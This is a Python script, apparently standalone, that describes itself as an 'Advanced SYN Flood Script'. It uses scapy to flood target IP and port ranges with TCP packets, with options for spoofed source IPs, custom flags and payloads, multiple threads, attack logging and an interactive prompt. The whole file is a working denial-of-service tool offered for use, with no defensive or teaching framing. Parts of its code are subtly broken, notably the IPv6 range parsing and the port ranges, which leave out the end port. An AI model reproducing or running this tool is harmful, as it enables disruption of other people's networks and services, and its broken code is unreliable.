import argparse
import threading
import random
import string
import time
from scapy.all import *

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

def syn_flood(target_ips, target_ports, rate, size, spoof_ip, packet_count, source_port_range, log_file, tcp_flags, payload):
    sent_packets = 0
    start_time = time.time()
    
    with open(log_file, 'a') as log:
        for _ in range(packet_count):
            target_ip = random.choice(target_ips)
            target_port = random.choice(target_ports)
            ip_layer = IP(dst=target_ip) if ":" not in target_ip else IPv6(dst=target_ip)
            if spoof_ip:
                ip_layer.src = RandIP("192.168.1.1/24")
            
            source_port = random.randint(*source_port_range)
            tcp_layer = TCP(sport=source_port, dport=target_port, flags=tcp_flags)
            http_layer = Raw(payload.encode() if payload else b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n" % (target_ip.encode(), random.choice(USER_AGENTS).encode()))

            packet = ip_layer / tcp_layer / http_layer / Raw(generate_random_data(size))
            send(packet, verbose=0)
            log.write(f"Sent packet to {target_ip}:{target_port} from port {source_port}\n")
            sent_packets += 1
            time.sleep(rate)

            # Real-time statistics
            if sent_packets % 10 == 0:
                elapsed_time = time.time() - start_time
                print(f"Sent {sent_packets} packets in {elapsed_time:.2f} seconds (avg rate: {sent_packets/elapsed_time:.2f} packets/sec)")

def main():
    parser = argparse.ArgumentParser(description="Advanced SYN Flood Script")
    parser.add_argument('target_ip_range', type=str, help='Target IP address range (e.g., 192.168.1.1-192.168.1.10 or 2001:db8::1-2001:db8::10)')
    parser.add_argument('target_port_range', type=str, help='Target port range (e.g., 80-80 or 80-90)')
    parser.add_argument('--rate', type=float, default=0.1, help='Packet send rate (seconds)')
    parser.add_argument('--size', type=int, default=1024, help='Size of the flooding data in bytes')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads')
    parser.add_argument('--count', type=int, default=1000, help='Number of packets to send')
    parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing')
    parser.add_argument('--source-port-range', type=str, default='1024-65535', help='Source port range (e.g., 1024-65535)')
    parser.add_argument('--log-file', type=str, default='attack.log', help='Log file to store attack details')
    parser.add_argument('--tcp-flags', type=str, default='S', help='TCP flags (e.g., S for SYN, A for ACK)')
    parser.add_argument('--payload', type=str, default='', help='Custom payload')
    parser.add_argument('--interactive', action='store_true', help='Enable interactive mode')

    args = parser.parse_args()

    if args.interactive:
        args.target_ip_range = input("Enter target IP address range: ")
        args.target_port_range = input("Enter target port range: ")
        args.rate = float(input("Enter packet send rate (seconds): "))
        args.size = int(input("Enter size of flooding data (bytes): "))
        args.threads = int(input("Enter number of threads: "))
        args.count = int(input("Enter number of packets to send: "))
        args.spoof = input("Enable IP spoofing (yes/no): ").lower() == 'yes'
        args.source_port_range = input("Enter source port range: ")
        args.log_file = input("Enter log file name: ")
        args.tcp_flags = input("Enter TCP flags: ")
        args.payload = input("Enter custom payload: ")

    target_ips = args.target_ip_range.split('-')
    if len(target_ips) == 2:
        if ":" in target_ips[0]:  # IPv6
            start_ip = list(map(int, target_ips[0].split(':')))
            end_ip = list(map(int, target_ips[1].split(':')))
            target_ips = [
                f"{':'.join(map(str, a))}"
                for a in range(start_ip[0], end_ip[0] + 1)
                for b in range(start_ip[1], end_ip[1] + 1)
                for c in range(start_ip[2], end_ip[2] + 1)
                for d in range(start_ip[3], end_ip[3] + 1)
                for e in range(start_ip[4], end_ip[4] + 1)
                for f in range(start_ip[5], end_ip[5] + 1)
                for g in range(start_ip[6], end_ip[6] + 1)
                for h in range(start_ip[7], end_ip[7] + 1)
            ]
        else:  # IPv4
            start_ip = list(map(int, target_ips[0].split('.')))
            end_ip = list(map(int, target_ips[1].split('.')))
            target_ips = [
                f"{a}.{b}.{c}.{d}"
                for a in range(start_ip[0], end_ip[0] + 1)
                for b in range(start_ip[1], end_ip[1] + 1)
                for c in range(start_ip[2], end_ip[2] + 1)
                for d in range(start_ip[3], end_ip[3] + 1)
            ]
    else:
        target_ips = [args.target_ip_range]

    target_ports = list(range(*map(int, args.target_port_range.split('-'))))
    source_port_range = list(map(int, args.source_port_range.split('-')))

    print(f"Starting SYN flood attack on {args.target_ip_range}:{args.target_port_range} with {args.threads} thread(s), rate: {args.rate} seconds, data size: {args.size} bytes, packet count: {args.count}, IP spoofing: {'enabled' if args.spoof else 'disabled'}, logging to {args.log_file}, TCP flags: {args.tcp_flags}, custom payload: {'enabled' if args.payload else 'disabled'}")

    try:
        threads = []
        for _ in range(args.threads):
            thread = threading.Thread(target=syn_flood, args=(target_ips, target_ports, args.rate, args.size, args.spoof, args.count // args.threads, source_port_range, args.log_file, args.tcp_flags, args.payload))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Attack stopped by user")
    except Exception as e:
        print(f"An error occurred: {e}")

    print("Script terminated")

if __name__ == "__main__":
    main()
